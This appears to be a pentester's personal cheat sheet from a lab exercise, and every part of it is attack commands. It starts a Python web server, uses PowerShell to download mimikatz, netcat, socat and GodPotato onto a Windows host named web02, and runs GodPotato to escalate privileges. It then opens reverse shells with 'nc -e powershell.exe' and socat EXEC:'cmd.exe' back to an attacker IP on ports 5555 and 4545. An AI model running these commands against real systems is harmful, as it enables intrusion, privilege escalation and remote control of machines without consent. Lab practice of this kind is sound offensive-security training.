launch the python web server
```
python -m http.server
```

download from web02 with powershell
```
cd C:\Tools; Invoke-WebRequest http://192.168.45.167:8080/x64/mimikatz.exe -OutFile mimikatz.exe; Invoke-WebRequest http://192.168.45.167:8080/x64/mimidrv.sys -OutFile mimidrv.sys; Invoke-WebRequest http://192.168.45.167:8080/x64/mimilib.dll -OutFile mimilib.dll; iwr http://192.168.45.167:8080/nc.exe -outfile nc.exe; iwr http://192.168.45.167:8080/godpotato.exe -outfile godpotato.exe
```

listen to revshell
```
nc -nlvp 5555
```

godpotato
```
.\godpotato.exe -cmd "C:\Tools\nc.exe -e powershell.exe 192.168.45.167 5555"
```

godpotato (socat.exe version)
```
wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe
```

```
iwr http://192.168.45.167:8080/socatx64.exe -outfile socat.exe
```

```
socat TCP4-LISTEN:4545,fork STDOUT
```

```
.\godpotato.exe -cmd "C:\Tools\socat.exe TCP4:192.168.45.167:4545 EXEC:'cmd.exe',pipes"
```